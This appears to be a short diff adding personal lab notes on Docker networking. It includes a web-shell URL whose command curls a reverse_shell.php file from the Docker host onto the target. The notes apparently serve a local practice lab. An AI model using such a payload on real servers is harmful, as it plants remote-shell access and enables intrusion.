@@ -1,0 +1,4 @@
+Docker Desktop for Mac uses host.docker.internal for the host IP
+
+## My reverse_shell look
+http://localhost:8080/shell.php?cmd=curl%20http://host.docker.internal:5000/reverse_shell.php%20%3E%20reverse_shell.php
